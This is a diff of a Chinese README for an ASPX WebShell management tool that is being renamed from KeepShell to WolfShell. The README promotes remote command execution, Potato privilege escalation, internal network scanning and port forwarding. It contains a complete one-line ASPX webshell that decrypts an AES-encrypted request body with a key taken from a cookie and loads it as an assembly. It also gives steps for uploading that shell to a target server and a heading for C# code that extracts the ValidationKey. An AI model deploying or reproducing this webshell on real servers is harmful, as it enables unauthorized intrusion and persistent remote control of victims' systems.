@@ -1,7 +1,9 @@
 
-# KeepShell：首款支持内网级联的WebShell管理工具
+![WolfShell](http://www.18k.icu/img/wolfshell/wolf.png)
 
-KeepShell 是一款专为 ASPX 环境设计的高级 WebShell 管理工具，为安全研究人员和渗透测试人员提供强大的命令执行、权限提升和内网穿透能力。
+# WolfShell：专为ASPX设计的高级WebShell管理工具
+
+WolfShell 是一款专为 ASPX 环境设计的高级 WebShell 管理工具，为安全研究人员和渗透测试人员提供强大的命令执行、权限提升和内网穿透能力。
 
 ## 🚀 核心优势
 
@@ -26,14 +28,14 @@ KeepShell 是一款专为 ASPX 环境设计的高级 WebShell 管理工具，为
 
 ## 安装与使用
 
-1. **下载KeepShell**
-   - https://github.com/0x7556/keepshell/releases
+1. **下载WolfShell**
+   - https://github.com/0x7556/wolfshell/releases
 
 2. **配置环境**
    - 确保目标环境支持ASPX，并已正确配置。
 
-3. **上传KeepShell**
-   - 将KeepShell文件上传到目标ASPX服务器。
+3. **上传WolfShell**
+   - 将WolfShell文件上传到目标ASPX服务器。
    
 ```csharp
 <%@ Page Language="C#" %><%if (Request.Cookies.Count != 0) { byte[] k = Encoding.Default.GetBytes(Request.Cookies[0].Value); System.IO.Stream s = Request.InputStream; byte[] c = new byte[s.Length]; s.Read(c, 0, c.Length); System.Reflection.Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("K").Equals(this); }%>
@@ -41,22 +43,22 @@ KeepShell 是一款专为 ASPX 环境设计的高级 WebShell 管理工具，为
 4. **访问WebShell**
    - 通过工具客户端连接WebShell，开始使用。
 
-![keep](http://www.18k.icu/img/keepshell/Keep.png)
+![keep](http://www.18k.icu/img/wolfshell/WolfShell.png)
 
 
 ## 示例
 
 ### Cmd命令执行
 
-![CmdShell示例](http://www.18k.icu/img/keepshell/CmdShell.png)
+![CmdShell示例](http://www.18k.icu/img/wolfshell/CmdShell.png)
 
 ### PowerShell命令执行
 
-![PowerShell示例](http://www.18k.icu/img/keepshell/PowerShell.png)
+![PowerShell示例](http://www.18k.icu/img/wolfshell/PowerShell.png)
 
-### C#代码执行示例
+### C#代码执行
 
-#### 获取 ValidationKey
+#### 获取 ValidationKey 示例代码
 
 ```csharp
 
@@ -77,9 +79,9 @@ return "ValidationKey: " + cg.ValidationKey + " | " + "Validation: " + cg.Valida
 
 ```
 
-![C#代码示例](http://www.18k.icu/img/keepshell/CodeExec.png)
+![C#代码示例](http://www.18k.icu/img/wolfshell/SharpCode2.png)
 
-#### ICMP扫描C段存活主机
+#### 扫描C段存活主机 示例代码
 ```csharp
 
 using System;
@@ -123,31 +125,31 @@ return iplist.ToString();
 ```
 
 
-![C#代码示例](http://www.18k.icu/img/keepshell/CodeExecIcmp.png)
+![C#代码示例](http://www.18k.icu/img/wolfshell/SharpCode.png)
 
 ### Potato提权示例
 
 #### efspotato
 
-![EfsPotato示例](http://www.18k.icu/img/keepshell/EfsPotato.png)
+![EfsPotato示例](http://www.18k.icu/img/wolfshell/EfsPotato.png)
 
 #### badpotato
 
 
-![BadPotato示例](http://www.18k.icu/img/keepshell/BadPotato.png)
+![BadPotato示例](http://www.18k.icu/img/wolfshell/BadPotato.png)
 
 ### 内网扫描示例
 
-![NetScan示例](http://www.18k.icu/img/keepshell/NetScan.png)
+![NetScan示例](http://www.18k.icu/img/wolfshell/NetScan.png)
 
 ### 端口转发示例
 
-![端口转发示例](http://www.18k.icu/img/keepshell/PortTran.png)
+![端口转发示例](http://www.18k.icu/img/wolfshell/PortTran.png)
 
 
 ## 免责声明
 
-- 使用KeepShell时，请遵循相关法律法规，确保在授权的环境中进行测试和使用。
+- 使用WolfShell时，请遵循相关法律法规，确保在授权的环境中进行测试和使用。
 - 本工具仅供教育和研究目的，任何滥用行为将由用户自行承担后果。
 
 ## 贡献
